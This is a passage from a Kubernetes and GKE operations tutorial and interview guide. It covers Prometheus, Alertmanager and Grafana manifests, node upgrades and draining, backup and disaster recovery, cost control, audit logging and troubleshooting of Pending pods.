              cpu: 250m
              memory: 512Mi
            limits:
              cpu: "1"
              memory: 1Gi
          startupProbe:
            httpGet:
              path: /-/ready
              port: http
            periodSeconds: 5
            failureThreshold: 60
          livenessProbe:
            httpGet:
              path: /-/healthy
              port: http
            periodSeconds: 20
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /-/ready
              port: http
            periodSeconds: 10
            failureThreshold: 3
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: config
              mountPath: /etc/prometheus/prometheus.yml
              subPath: prometheus.yml
            - name: rules
              mountPath: /etc/prometheus/rules
            - name: data
              mountPath: /prometheus
      volumes:
        - name: config
          configMap:
            name: prometheus-config
        - name: rules
          configMap:
            name: prometheus-rules
  volumeClaimTemplates:
    - metadata:
        name: data
      spec:
        accessModes:
          - ReadWriteOnce
        storageClassName: shopwave-balanced-delete
        resources:
          requests:
            storage: 10Gi
```

> **`terminationGracePeriodSeconds: 300` on Prometheus is deliberate.** Prometheus must flush its in-memory head block (up to 2 hours of samples) to disk on shutdown. SIGKILL it and it replays the WAL on restart — which for a large TSDB takes **many minutes** during which **you have no monitoring**, i.e. precisely when you're mid-incident and just restarted it.

> **Notice `--web.enable-lifecycle` and `--web.enable-admin-api=false`.** Lifecycle gives you `POST /-/reload` to pick up a config change without a restart (which matters, given the WAL replay above). The admin API includes **delete-series and snapshot** endpoints — leaving it on means anyone who can reach Prometheus can destroy your metrics. Off.

> **`subPath: prometheus.yml` — and remember Part 11: a `subPath` mount NEVER updates.** So editing `prometheus-config` will *not* reach the container. You need `kubectl rollout restart` or `POST /-/reload` after re-mounting without subPath. This is the two-gotchas-interacting situation that real clusters are made of, and it's worth pointing out that we've knowingly accepted it here because we reload explicitly.

## 16.5 Alertmanager

`16-observability/10-alertmanager.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: alertmanager-config
  namespace: monitoring
data:
  alertmanager.yml: |
    global:
      resolve_timeout: 5m

    route:
      receiver: default
      group_by: ['alertname', 'service', 'severity']
      group_wait: 30s
      group_interval: 5m
      repeat_interval: 4h
      routes:
        - matchers:
            - severity = "page"
          receiver: pagerduty
          group_wait: 10s
          repeat_interval: 1h
        - matchers:
            - severity = "ticket"
          receiver: slack
          repeat_interval: 12h

    inhibit_rules:
      # If the whole service is down, don't also page about its latency.
      - source_matchers:
          - alertname = "ShopwaveServiceDown"
        target_matchers:
          - severity =~ "page|ticket"
        equal: ['service']

    receivers:
      - name: default
        slack_configs:
          - api_url_file: /etc/alertmanager/secrets/slack-url
            channel: '#shopwave-alerts'

      - name: slack
        slack_configs:
          - api_url_file: /etc/alertmanager/secrets/slack-url
            channel: '#shopwave-alerts'
            title: '{{ .CommonLabels.alertname }} — {{ .CommonLabels.service }}'
            text: '{{ range .Alerts }}{{ .Annotations.summary }}\n{{ end }}'

      - name: pagerduty
        pagerduty_configs:
          - routing_key_file: /etc/alertmanager/secrets/pagerduty-key
            description: '{{ .CommonLabels.alertname }} on {{ .CommonLabels.service }}'
            severity: critical
---
apiVersion: v1
kind: Service
metadata:
  name: alertmanager
  namespace: monitoring
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: alertmanager
  ports:
    - name: http
      port: 9093
      targetPort: http
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: alertmanager
  namespace: monitoring
  labels:
    app.kubernetes.io/name: alertmanager
spec:
  replicas: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: alertmanager
  template:
    metadata:
      labels:
        app.kubernetes.io/name: alertmanager
    spec:
      automountServiceAccountToken: false
      enableServiceLinks: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        fsGroup: 65534
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: alertmanager
          image: prom/alertmanager:v0.27.0
          args:
            - --config.file=/etc/alertmanager/alertmanager.yml
            - --storage.path=/alertmanager
          ports:
            - name: http
              containerPort: 9093
          resources:
            requests:
              cpu: 50m
              memory: 128Mi
            limits:
              cpu: 200m
              memory: 256Mi
          livenessProbe:
            httpGet:
              path: /-/healthy
              port: http
            periodSeconds: 20
          readinessProbe:
            httpGet:
              path: /-/ready
              port: http
            periodSeconds: 10
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: config
              mountPath: /etc/alertmanager
            - name: secrets
              mountPath: /etc/alertmanager/secrets
              readOnly: true
            - name: data
              mountPath: /alertmanager
      volumes:
        - name: config
          configMap:
            name: alertmanager-config
        - name: secrets
          secret:
            secretName: alertmanager-secrets
        - name: data
          emptyDir:
            sizeLimit: 256Mi
```

> **The four routing timers, and what each is actually for** — this gets asked and people conflate them:
>
> | Field | Purpose |
> |---|---|
> | `group_wait: 30s` | On the **first** alert of a new group, wait 30s to see if siblings arrive. One notification for "12 pods down", not 12 notifications. |
> | `group_interval: 5m` | Once a group has notified, wait 5m before sending an update **about new alerts added to that group**. |
> | `repeat_interval: 4h` | Re-notify about an **unchanged, still-firing** alert. This is your "did anyone look at this?" nag. |
> | `resolve_timeout: 5m` | If Prometheus stops sending an alert, consider it resolved after 5m. |
>
> **`inhibit_rules` is the underused one.** When a service is completely down, you get: ServiceDown, HighLatency, HighErrorRate, PodNotReady, HPAMaxedOut — **five pages for one problem** at 03:00. Inhibition says "if ServiceDown is firing for service X, suppress everything else for service X." **Alert fatigue is an availability problem**, because an on-call who has been paged 5 times for one incident stops reading page 6. Saying that out loud is what SRE maturity sounds like.

> **`api_url_file` / `routing_key_file`, not `api_url` / `routing_key`.** The secret is mounted from a Secret, not inlined in a ConfigMap that anyone with `get configmap` can read. A Slack webhook URL **is** a credential.

## 16.6 Grafana

`16-observability/20-grafana.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: grafana-datasources
  namespace: monitoring
data:
  datasources.yaml: |
    apiVersion: 1
    datasources:
      - name: Prometheus
        type: prometheus
        access: proxy
        url: http://prometheus:9090
        isDefault: true
        jsonData:
          timeInterval: 30s
---
apiVersion: v1
kind: Service
metadata:
  name: grafana
  namespace: monitoring
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: grafana
  ports:
    - name: http
      port: 3000
      targetPort: http
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: grafana
  namespace: monitoring
  labels:
    app.kubernetes.io/name: grafana
spec:
  replicas: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: grafana
  template:
    metadata:
      labels:
        app.kubernetes.io/name: grafana
    spec:
      automountServiceAccountToken: false
      enableServiceLinks: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 472
        fsGroup: 472
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: grafana
          image: grafana/grafana:11.1.0
          ports:
            - name: http
              containerPort: 3000
          env:
            - name: GF_SECURITY_ADMIN_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: grafana-credentials
                  key: admin-password
            - name: GF_USERS_ALLOW_SIGN_UP
              value: "false"
            - name: GF_AUTH_ANONYMOUS_ENABLED
              value: "false"
            - name: GF_ANALYTICS_REPORTING_ENABLED
              value: "false"
          resources:
            requests:
              cpu: 100m
              memory: 256Mi
            limits:
              cpu: 500m
              memory: 512Mi
          livenessProbe:
            httpGet:
              path: /api/health
              port: http
            periodSeconds: 20
          readinessProbe:
            httpGet:
              path: /api/health
              port: http
            periodSeconds: 10
          securityContext:
            allowPrivilegeEscalation: false
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: datasources
              mountPath: /etc/grafana/provisioning/datasources
            - name: data
              mountPath: /var/lib/grafana
      volumes:
        - name: datasources
          configMap:
            name: grafana-datasources
        - name: data
          emptyDir:
            sizeLimit: 1Gi
```

```bash
kubectl port-forward -n monitoring svc/grafana 3000:3000
```

> **Grafana's `emptyDir` is a deliberate, stated trade-off.** Dashboards should be **provisioned from ConfigMaps** (dashboards-as-code, in git, reviewed), not clicked into a database that lives on a PVC nobody backs up. If your dashboards only exist inside Grafana's SQLite, you have an undocumented, unversioned, unrecoverable production asset. Also note: this `emptyDir` is exactly the thing that **blocks Cluster Autoscaler scale-down** (Part 14) — which is fine here because it's on the system pool, which we don't scale to zero. Knowing why it's acceptable *here* is better than not knowing it's a problem at all.

## 16.7 The GKE-native alternative

```bash
gcloud container clusters update $CLUSTER --region=$REGION \
  --enable-managed-prometheus
```

`16-observability/30-podmonitoring.yaml`:

```yaml
apiVersion: monitoring.googleapis.com/v1
kind: PodMonitoring
metadata:
  name: shopwave
  namespace: shopwave-prod
spec:
  selector:
    matchLabels:
      app.kubernetes.io/part-of: shopwave
  endpoints:
    - port: http
      interval: 30s
      path: /metrics
```

> **Google Cloud Managed Service for Prometheus is a drop-in for the collection and storage half.** It runs the collectors for you, stores in **Monarch** (Google's planet-scale TSDB — the thing that runs Google's own monitoring), and gives you **PromQL over it** with **24 months** of retention. You keep writing PromQL and Grafana dashboards; you stop operating a Prometheus StatefulSet, sizing its PVC, tuning WAL replay, and sharding it when it OOMs.
>
> **The honest trade-off:** you pay per sample ingested, which at high cardinality is genuinely expensive; you lose some Prometheus features and some control; and you're locked to GCP. **Cardinality management becomes a cost discipline, not just a performance one.**
>
> **Why show both?** Because "we run self-hosted Prometheus" and "we use managed" are both defensible, and the interviewer wants to know **you know what you're trading**. Running the self-hosted stack once is also how you learn what the managed one is doing for you.

## 16.8 The three pillars, honestly

| Pillar | Tool here | Answers |
|---|---|---|
| **Metrics** | Prometheus | *"Is it broken, and how badly?"* Cheap, aggregatable, alertable. Low cardinality. |
| **Logs** | fluent-bit → Cloud Logging | *"What exactly happened to this one request?"* Expensive, high cardinality. |
| **Traces** | OpenTelemetry → Cloud Trace | *"Which of the 7 services is the slow one?"* |

> **You alert on metrics. You debug with logs and traces.** Never alert on log content if you can help it — it's expensive, it's laggy, and it's brittle. The right shape is: a **metric** fires the alert → a **dashboard** localises it to a service → **traces** find the slow span → **logs** give you the exception.
>
> **Cardinality is the thing that kills Prometheus, and it's the thing to volunteer.** Every unique label combination is a **separate time series** stored in memory. Put `user_id` or `order_id` or a raw URL path in a label and you get millions of series and an OOMKilled Prometheus. Look at our metrics: `shopwave_requests_total{service, method, endpoint, status}` — `endpoint` is `/api/products/:sku`, **the templated route, not the actual SKU**. That single decision is the difference between 40 series and 40,000. **High-cardinality identifiers belong in logs and traces, never in metric labels.**

## 16.9 Verify

```bash
kubectl apply -f 14-batch/
kubectl apply -f 15-daemonset/
kubectl apply -f 16-observability/

kubectl get daemonset -n platform
kubectl get pods -n platform -o wide          # one per node, including tainted
kubectl get pods -n monitoring

kubectl port-forward -n monitoring svc/prometheus 9090:9090
# http://localhost:9090/targets  -> every shopwave pod should be UP
# http://localhost:9090/alerts   -> rules loaded

kubectl exec -n monitoring prometheus-0 -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=up{job="kubernetes-pods"}' | head -c 500
```

Useful PromQL to have at your fingertips:

```promql
# Error rate by service
sum by (service) (rate(shopwave_requests_total{status=~"5.."}[5m]))
  / sum by (service) (rate(shopwave_requests_total[5m]))

# p99 latency by service
histogram_quantile(0.99, sum by (service, le) (rate(shopwave_request_duration_seconds_bucket[5m])))

# Which pods are being throttled? (the answer to "why is it slow but CPU looks fine")
rate(container_cpu_cfs_throttled_seconds_total{namespace="shopwave-prod"}[5m])

# Memory usage vs limit - your OOMKill early warning
container_memory_working_set_bytes{namespace="shopwave-prod"}
  / on(pod, container) kube_pod_container_resource_limits{resource="memory"}

# Restarts
increase(kube_pod_container_status_restarts_total{namespace="shopwave-prod"}[1h])

# Who is the inventory leader right now?
shopwave_is_leader == 1
```

> **`container_cpu_cfs_throttled_seconds_total` is the metric nobody knows and everybody needs.** A pod at 40% CPU utilisation that is being **CFS-throttled** is *slow* and your CPU dashboard says it's *fine*. This happens when the limit is low and the app is bursty: the kernel enforces the limit over 100ms periods, so an app that needs 200ms of CPU in one burst gets throttled even though its 5-minute average is trivial. **"My service is slow but CPU is low" is throttling, and this is the metric that proves it.** Bring this up unprompted and you will stand out.

## 16.10 Part 16 interview talking points

- Job: `completions`/`parallelism`/`backoffLimit`/`activeDeadlineSeconds`
- **`restartPolicy: Never` vs `OnFailure` in a Job** — and why `Never` is better for debugging
- **`ttlSecondsAfterFinished`** — without it, Jobs accumulate forever in etcd
- Migrations must be idempotent because the Job **will** be retried
- CronJob `concurrencyPolicy: Allow` is the default and is almost always wrong
- **The 100-missed-schedules death** and `startingDeadlineSeconds`
- `timeZone` is 1.27+; before that everything was UTC
- `kubectl create job --from=cronjob/...`
- DaemonSet: auto-injected `nodeAffinity` **and** tolerations for not-ready/unreachable — which is why it keeps logging on a broken node
- `tolerations: - operator: Exists` = tolerate everything
- Why the log shipper forces `platform` to be a privileged namespace — and naming exactly which control you relaxed
- **The self-log amplification loop** and `Exclude_Path`
- `nonResourceURLs` in RBAC
- Annotation-based service discovery and relabelling
- Recording rules and the `level:metric:operation` convention
- **Multi-window multi-burn-rate SLO alerting** — the 14.4× table, and why you AND a long and a short window
- Alertmanager's four timers; `inhibit_rules`; **alert fatigue is an availability problem**
- Managed Prometheus / Monarch — and the honest trade-off
- Three pillars: alert on metrics, debug with logs and traces
- **Cardinality**: templated route labels, never raw IDs
- **`container_cpu_cfs_throttled_seconds_total`** — "slow but CPU is low"


---

# Part 17 — Day-2 Operations

## 17.1 Cluster upgrades

GKE upgrades in two independent halves, and conflating them is a classic mistake.

```
[1] CONTROL PLANE          [2] NODES
    Google upgrades it.        You (or auto-upgrade) upgrade them.
    ~10-20 min.                Time = nodes x drain time.
    Workloads unaffected.      Workloads ARE affected.
    No kubectl during part.    Rolling, PDB-gated.
```

**Version skew — the rule that constrains everything:**

> The **kubelet may be up to 3 minor versions behind** the API server (relaxed from 2 in 1.28), and **never ahead**. So: control plane first, always. Nodes second. You can run a 1.30 control plane with 1.27 nodes; you can never run 1.27 control plane with 1.30 nodes. This is why GKE physically refuses to upgrade a node pool past the master, and why "upgrade the control plane first" is not a preference, it's a constraint.

```bash
# What's available?
gcloud container get-server-config --region=$REGION \
  --format="yaml(channels)"

# Control plane
gcloud container clusters upgrade $CLUSTER --region=$REGION \
  --master --cluster-version=1.30.3-gke.1234000

# Nodes, one pool at a time
gcloud container clusters upgrade $CLUSTER --region=$REGION \
  --node-pool=app-pool --cluster-version=1.30.3-gke.1234000
```

### Upgrade strategies

**Surge upgrade** (our default, set in Part 2):

```bash
gcloud container node-pools update app-pool \
  --cluster=$CLUSTER --region=$REGION \
  --max-surge-upgrade=2 \
  --max-unavailable-upgrade=0
```

`maxSurge=2, maxUnavailable=0`: add 2 new nodes, drain 2 old, repeat. Capacity never dips. You pay for 2 extra nodes for the duration.

> `maxSurge` and `maxUnavailable` on a **node pool** are not the same fields as on a Deployment, and both matter — the node pool controls how many *nodes* churn at once, the Deployment controls how many *pods*. During a node upgrade both are in play simultaneously, and a Deployment with `maxUnavailable: 0` and no headroom will make each node drain slower.


> **FREE-TIER CAVEAT.** Blue/green and surge upgrades both need **spare vCPU for a second set of nodes**. On a 12-vCPU trial that's already ~half-consumed, you can't spare it — so on the free tier you'll take the simpler in-place node upgrade and accept brief capacity dips (your PDBs still gate the drains). Know the blue/green method for the interview; use it when you have real quota.

**Blue/green node pool upgrade** — the enterprise-grade one:

```bash
gcloud container node-pools update app-pool \
  --cluster=$CLUSTER --region=$REGION \
  --enable-blue-green-upgrade \
  --node-pool-soak-duration=1800s \
  --standard-rollout-policy=batch-percent=25,batch-soak-duration=300s
```

> **What it does:** creates a **complete second (green) node pool** on the new version, cordons and drains the blue pool in batches, **soaks** for 30 minutes, and only then deletes blue. If anything is wrong during the soak, **`gcloud container node-pools rollback`** puts everything back on the original nodes **in minutes**, because they still exist.
>
> **Surge upgrade cannot be rolled back** — the old nodes are gone. That's the entire argument, and it's the answer to "how would you make a node upgrade reversible?" The cost is 2× node capacity for the duration of the upgrade.

**Manual blue/green, for full control:**

```bash
# 1. Create a new pool on the new version
gcloud container node-pools create app-pool-v2 \
  --cluster=$CLUSTER --region=$REGION \
  --node-version=1.30.3-gke.1234000 \
  --machine-type=e2-standard-4 \
  --num-nodes=1 --enable-autoscaling --min-nodes=1 --max-nodes=4 \
  --node-labels=pool=app,workload-type=stateless \
  --max-pods-per-node=64 --workload-metadata=GKE_METADATA

# 2. Cordon the old pool - no NEW pods land there
for node in $(kubectl get nodes -l cloud.google.com/gke-nodepool=app-pool -o name); do
  kubectl cordon $node
done

# 3. Drain, one node at a time, watching
for node in $(kubectl get nodes -l cloud.google.com/gke-nodepool=app-pool -o name); do
  kubectl drain $node \
    --ignore-daemonsets \
    --delete-emptydir-data \
    --grace-period=60 \
    --timeout=600s
  sleep 60   # let things settle and watch dashboards
done

# 4. Verify, then delete
gcloud container node-pools delete app-pool --cluster=$CLUSTER --region=$REGION
```

## 17.2 cordon, drain, uncordon

```bash
kubectl cordon <node>      # SchedulingDisabled: no new pods. Existing stay.
kubectl uncordon <node>    # undo
kubectl drain <node> --ignore-daemonsets --delete-emptydir-data
```

**What `drain` actually does, in order:**

1. **Cordons** the node (`spec.unschedulable: true`, which manifests as the `node.kubernetes.io/unschedulable:NoSchedule` taint).
2. For every pod on the node, calls the **Eviction API** (`pods/eviction`), **not** DELETE.
3. The API server checks **PDBs**. If evicting would violate one → **`429 Too Many Requests`**.
4. `drain` **retries** until it succeeds or hits `--timeout`.

**The flags, and why each exists:**

| Flag | Why |
|---|---|
| `--ignore-daemonsets` | **Required in practice.** DaemonSet pods are immediately recreated by their controller, so draining them is pointless and `drain` refuses to proceed without this flag. |
| `--delete-emptydir-data` | Pods with `emptyDir` will **lose data**. `drain` refuses unless you acknowledge it. |
| `--force` | Deletes pods with **no controller** (bare pods). They will **not come back**. |
| `--grace-period=60` | Overrides `terminationGracePeriodSeconds`. **Careful** — set it below your app's drain time and you cut transactions. |
| `--timeout=600s` | How long to keep retrying against PDBs. |
| `--pod-selector` | Drain only some pods. |
| `--disable-eviction` | **Uses DELETE instead of the Eviction API — bypassing PDBs entirely.** The nuclear option. |

> **`kubectl drain` hangs. Why?** Almost always a PDB with **0 allowed disruptions**:
> ```bash
> kubectl get pdb -A
> # ALLOWED DISRUPTIONS: 0  <- there it is
> kubectl describe pdb <name> -n <ns>
> ```
> Causes: `maxUnavailable: 0`; `minAvailable` == `replicas`; or the workload is already degraded (2 of 3 pods down, so evicting the third violates `minAvailable: 2` — the PDB is doing exactly its job, and you should fix the workload, not the PDB).
>
> **`--disable-eviction` exists and you should almost never use it.** Knowing it exists, and that using it means you've decided to violate your own availability contract, is the right answer.

> **Draining a node with a StatefulSet pod on a PD.** The pod is evicted, rescheduled — and the PD must **detach from the old node and attach to the new one**. That takes **30–60 seconds** and it **cannot happen until the old pod is fully terminated**, because the disk is `ReadWriteOnce`. If the old kubelet is unresponsive (node dying rather than draining), the detach blocks on a 6-minute force-detach timeout. **This is why `postgres-0` takes minutes to move, not seconds**, and it's a great specific answer.

## 17.3 Backup and DR

### What you actually need to back up

| Layer | Contains | Method |
|---|---|---|
| **etcd** | Every Kubernetes object | **On GKE: Google's problem.** You cannot access etcd. |
| **Object manifests** | Your desired state | **Git.** This is the real answer. |
| **PersistentVolumes** | Application data | **VolumeSnapshots** (Part 12) or Backup for GKE |
| **Secrets** | Credentials | **Secret Manager** — versioned, outside the cluster (Part 11) |
| **Images** | Your code | **Artifact Registry** with immutable tags (Part 6) |

> **The key insight, and it's the answer to "how do you back up a Kubernetes cluster?":**
>
> **You don't back up a cluster. You back up the things a cluster cannot recreate.**
>
> Everything in `k8s/` is in git — so the cluster is **reproducible**, not backed up. The things that are *not* reproducible are the **PVs** and the **Secrets**, and those live outside Kubernetes (snapshots, Secret Manager). If you lost the whole cluster right now, you would: create a new one from the Part 1–2 commands, `kubectl apply -f k8s/`, restore the PVs from snapshots, and be running. **That is a DR plan; an etcd backup is not.**
>
> On GKE you *cannot* back up etcd anyway — it's Google-managed and inaccessible. If a candidate says "I'd take an etcd snapshot with `etcdctl`", they're describing a self-managed cluster and you should say so.

### Backup for GKE — the managed answer

```bash
gcloud services enable gkebackup.googleapis.com

gcloud container clusters update $CLUSTER --region=$REGION \
  --update-addons=BackupRestore=ENABLED

gcloud beta container backup-restore backup-plans create shopwave-daily \
  --project=$PROJECT_ID \
  --location=$REGION \
  --cluster=projects/$PROJECT_ID/locations/$REGION/clusters/$CLUSTER \
  --selected-namespaces=shopwave-prod \
  --include-secrets \
  --include-volume-data \
  --cron-schedule="0 19 * * *" \
  --backup-retain-days=30 \
  --locked
```

> **`--include-volume-data`** is what makes it a backup rather than a manifest dump — it snapshots the PDs too, and coordinates them with the object backup. **`--locked`** makes the retention policy immutable: **nobody, including a compromised admin, can shorten it or delete the backups.** That's a genuine ransomware control and worth naming as one.

### Restore drill — the thing that separates real from theatre

```bash
gcloud beta container backup-restore restores create shopwave-restore-test \
  --project=$PROJECT_ID --location=$REGION \
  --restore-plan=shopwave-restore-plan \
  --backup=projects/$PROJECT_ID/locations/$REGION/backupPlans/shopwave-daily/backups/<id>
```

> **Say this in an interview: "A backup you have never restored is not a backup, it's a hope."**
>
> Our restore drill is on the calendar, quarterly, into a **scratch cluster**, and it is **timed** — because the number you actually need is not "do we have backups", it's **"what is our RTO, measured, not estimated?"** Most teams discover during a real incident that the restore takes 6 hours and their RTO commitment was 1 hour.

### RTO / RPO — have numbers

| Scenario | RPO | RTO | Mechanism |
|---|---|---|---|
| Pod dies | 0 | ~30s | ReplicaSet |
| Node dies | 0 | ~5.5 min | Node lifecycle controller (Part 13) |
| Zone dies | 0 | ~5.5 min | Regional cluster + topology spread + regional PD |
| Bad deploy | 0 | ~2 min | `kubectl rollout undo` |
| Data corruption | ≤24h | ~1h | VolumeSnapshot restore |
| Region dies | ≤24h | Hours | Cross-region: rebuild + restore |
| Cluster deleted | ≤24h | ~1h | git apply + snapshot restore |

> Note the pattern: **everything Kubernetes handles itself has RPO 0**, and everything requiring a restore has an RPO equal to your snapshot interval. If someone needs RPO 0 for the database, Kubernetes doesn't give it to you — you need **synchronous replication** (Cloud SQL HA, or a Postgres operator with sync standbys), and the honest answer to "how do you get RPO 0 on a StatefulSet database?" is **"I'd move it to Cloud SQL, because running HA Postgres yourself on Kubernetes is a full-time job and the managed service already solved it."** Saying that is a *maturity* signal, not a weakness.

## 17.4 Node maintenance and repair

```bash
# What version is everything on?
kubectl get nodes -o custom-columns='NAME:.metadata.name,VERSION:.status.nodeInfo.kubeletVersion,POOL:.metadata.labels.cloud\.google\.com/gke-nodepool,ZONE:.metadata.labels.topology\.kubernetes\.io/zone'

# Node conditions - the health summary
kubectl get nodes -o json | jq -r '.items[] | "\(.metadata.name): \(.status.conditions[] | select(.status=="True") | .type)"'

# Node problem detector findings (GKE runs it by default)
kubectl get events --field-selector source=node-problem-detector -A
```

**Auto-repair** — GKE recreates a node whose health checks fail (`Ready=False` for ~10 min, or boot failure). It **drains first** (respecting PDBs, up to a timeout). This is on by default and it's why "a node vanished and came back new" happens without anyone touching it.

**Maintenance exclusions** for peak periods (from Part 2):

```bash
gcloud container clusters update $CLUSTER --region=$REGION \
  --add-maintenance-exclusion-name=diwali-freeze \
  --add-maintenance-exclusion-start=2026-10-15T00:00:00Z \
  --add-maintenance-exclusion-end=2026-11-05T00:00:00Z \
  --add-maintenance-exclusion-scope=no_minor_or_node_upgrades
```

## 17.5 Capacity and cost

```bash
# Requests vs allocatable per node - the number the SCHEDULER sees
kubectl describe nodes | grep -A6 "Allocated resources"

# Actual usage - the number REALITY sees
kubectl top nodes
kubectl top pods -n shopwave-prod --sort-by=memory
```

> **The gap between those two commands is your money.** `kubectl describe node` shows **requests** — what the scheduler reserved. `kubectl top` shows **usage** — what's actually consumed. A cluster at 85% requested and 20% used is **paying 4× too much**, and it will refuse to schedule new pods while looking idle in every dashboard. **Over-requesting is the single largest source of Kubernetes waste**, and the fix is VPA in recommendation mode (Part 14) feeding a quarterly right-sizing PR.

**GKE cost allocation:**

```bash
gcloud container clusters update $CLUSTER --region=$REGION \
  --enable-cost-allocation
```

This attributes cost to **namespace and label** in your billing export, which is what makes `cost-centre: retail-platform` on the namespace (Part 3) actually do something. Without it, your GKE line item is one number and showback is impossible.

**The FinOps levers, in order of impact:**

1. **Right-size requests** — VPA recommendations. Usually the biggest single win, often 30–50%.
2. **Spot nodes** for anything interruptible — 60–91% off. `notifications`, batch, CI, dev/staging.
3. **Scale to zero** — `min-nodes=0` on the spot pool.
4. **Committed Use Discounts** — 1yr/3yr commitments on your **baseline**, spot/on-demand for the peak.
5. **`optimize-utilization` autoscaling profile** — packs tighter.
6. **Delete untagged images** (Part 6) and orphaned PDs (`persistentVolumeClaimRetentionPolicy`, Part 12).
7. **Turn off WORKLOAD logging** and ship logs yourself, or add exclusion filters.
8. **Topology-aware routing** — cross-zone egress is billed (Part 9).

```bash
# Orphaned disks - PDs with no PVC. Pure waste.
gcloud compute disks list --filter="-users:*" --format="table(name,zone,sizeGb,status)"

# Cluster autoscaler decisions - is it scaling down at all?
kubectl get events -A --field-selector reason=ScaleDown
kubectl -n kube-system get configmap cluster-autoscaler-status -o yaml
```

> **`cluster-autoscaler-status` is the ConfigMap nobody knows about.** On GKE it's not always present, but on self-managed CA it contains the autoscaler's full reasoning: which node groups it considered, why it didn't scale down, which pods blocked it. It is the answer to "why isn't my cluster scaling down" and almost nobody looks at it.

## 17.6 The audit trail

```bash
gcloud logging read \
  'resource.type="k8s_cluster"
   AND protoPayload.methodName=~"pods.exec"
   AND resource.labels.cluster_name="shopwave-prod"' \
  --limit=50 --format=json | jq -r '.[] | "\(.timestamp) \(.protoPayload.authenticationInfo.principalEmail) \(.protoPayload.resourceName)"'
```

Every `kubectl exec` into prod, every Secret read, every RBAC change, lands in **Cloud Audit Logs** with the **human identity** attached. That is what makes the break-glass Role from Part 3 an actual control rather than a comment in a YAML file: **the grant is temporary and the use is permanent record.**

Alert on it:

```bash
gcloud logging metrics create prod-exec-count \
  --description="kubectl exec into shopwave-prod" \
  --log-filter='resource.type="k8s_cluster"
    AND protoPayload.methodName=~"pods.exec"
    AND protoPayload.resourceName=~"shopwave-prod"'
```

## 17.7 Part 17 interview talking points

- Control plane and nodes upgrade **separately**; **version skew: kubelet ≤3 minor behind, never ahead** → control plane first, always
- Surge upgrade vs **blue/green node pool upgrade** — the latter is **rollback-able**, the former is not
- What `drain` really does: cordon → **Eviction API** → PDB check → 429 → retry
- `--ignore-daemonsets`, `--delete-emptydir-data`, `--disable-eviction` and what each admits
- **Why a drain hangs**: PDB with 0 allowed disruptions
- Why a StatefulSet pod takes minutes to move: **RWO PD detach/attach**
- **"You don't back up a cluster, you back up what it can't recreate"**; on GKE you can't touch etcd anyway
- Backup for GKE: `--include-volume-data`, `--locked` as a ransomware control
- **An untested backup is a hope**; measure RTO, don't estimate it
- Have an RPO/RTO table; and know that **RPO 0 for a database means Cloud SQL, not a StatefulSet**
- `describe node` (requests) vs `top` (usage) — the gap is the money
- The FinOps lever list, right-sizing first
- Cost allocation makes namespace labels billable
- Audit logs are what make break-glass a control


---

# Part 18 — Troubleshooting Playbooks

Every gotcha in this document, reorganised by **symptom** — the way you actually meet them at 02:00.

## 18.1 The universal first four commands

```bash
kubectl get pods -n shopwave-prod -o wide
kubectl describe pod <pod> -n shopwave-prod          # read EVENTS at the bottom
kubectl logs <pod> -n shopwave-prod --previous       # the PREVIOUS container
kubectl get events -n shopwave-prod --sort-by=.lastTimestamp | tail -30
```

> **`describe` before `logs`.** Events tell you what Kubernetes tried to do and why it failed. Logs tell you what your app did. If the pod never started, there are no logs — and people stare at an empty log for ten minutes before checking events.
>
> **Events are garbage-collected after 1 hour by default.** If the incident started 90 minutes ago, the event is gone. That's why you ship events to Cloud Logging.

## 18.2 Pod is `Pending`

```bash
kubectl describe pod <pod> -n shopwave-prod | grep -A20 Events
```

Read the scheduler's message as a **filter tally** (Part 13).

| Message | Cause | Fix |
|---|---|---|
| `Insufficient cpu` / `Insufficient memory` | No node has enough **allocatable** (not capacity) | Scale up, right-size requests, check CA is on |
| `had untolerated taint {X}` | Missing toleration | Add the toleration **and** a nodeSelector |
| `node(s) didn't match Pod's node affinity/selector` | `nodeSelector`/affinity matches nothing | Check the actual node labels |
| `didn't match pod topology spread constraints` | `DoNotSchedule` can't be satisfied | More nodes in more zones, or `ScheduleAnyway` |
| `node(s) had volume node affinity conflict` | **PV is in zone A, the only free node is in zone B** | `WaitForFirstConsumer` (Part 12) |
| `pod has unbound immediate PersistentVolumeClaims` | PVC isn't bound | Check StorageClass exists, CSI driver healthy |
| `too many pods` | Node hit `max-pods-per-node` | More nodes, or a pool with a higher max-pods |
| **No pods exist at all, Deployment shows 0/3** | **ResourceQuota rejected the ReplicaSet** | **`kubectl describe rs`** (Part 3) |
| `Insufficient` but nodes look empty | Requests reserved, not used — the scheduler sees requests only | Right-size |

```bash
# Is the Cluster Autoscaler even trying?
kubectl get events -n shopwave-prod --field-selector reason=TriggeredScaleUp
kubectl get events -n shopwave-prod --field-selector reason=NotTriggerScaleUp
```

`NotTriggerScaleUp` with `pod didn't trigger scale-up: 1 max node group size reached` = raise `--max-nodes`. With `1 node(s) had volume node affinity conflict` = a new node wouldn't help either.

> **The one everyone misses:** IP exhaustion. `IP space exhausted` or `not enough free IP addresses` in the CA events = your **pods secondary range** is full (Part 1). Nodes won't add, and quota looks fine. There is **no fix without rebuilding the cluster.**

## 18.3 `CrashLoopBackOff`

```bash
kubectl logs <pod> -n shopwave-prod --previous     # THE command
kubectl describe pod <pod> -n shopwave-prod | grep -A5 "Last State"
```

`CrashLoopBackOff` is a **state**, not an error. The error is in the previous container's logs.

| Exit code | Meaning | Next step |
